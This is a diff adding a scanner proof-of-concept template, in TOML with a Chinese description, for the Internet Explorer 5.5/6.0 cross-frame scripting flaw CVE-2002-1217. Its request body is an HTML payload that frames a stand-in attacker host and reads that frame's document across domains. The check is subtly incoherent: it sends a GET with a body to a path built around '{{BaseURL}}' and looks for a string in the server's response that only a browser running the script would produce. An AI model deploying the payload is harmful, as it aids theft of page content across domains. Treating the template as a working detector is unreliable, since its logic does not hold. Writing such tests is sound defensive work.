@@ -1,0 +1,29 @@
+[info]
+author = "ave"
+description = "通过构造恶意HTML页面，利用IE 5.5/6.0 WebBrowser控件对跨域frame Document属性访问限制不严的漏洞，验证跨框架脚本执行"
+id = "POC-AVE-2002-0557"
+name = "Microsoft Internet Explorer 5.5/6.0 Cross-Frame Scripting PoC"
+severity = "high"
+tags = ["ave-2002-0557"]
+vuln_id = [
+    "CVE-2002-1217",
+    "AVE-2002-0557",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """<html><body><iframe id="f" src="http://attacker.com/"></iframe><script>try{var d=frames[0].document;document.write('VULN:'+d.body.innerHTML)}catch(e){document.write('SAFE')}</script></body></html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["VULN:"]
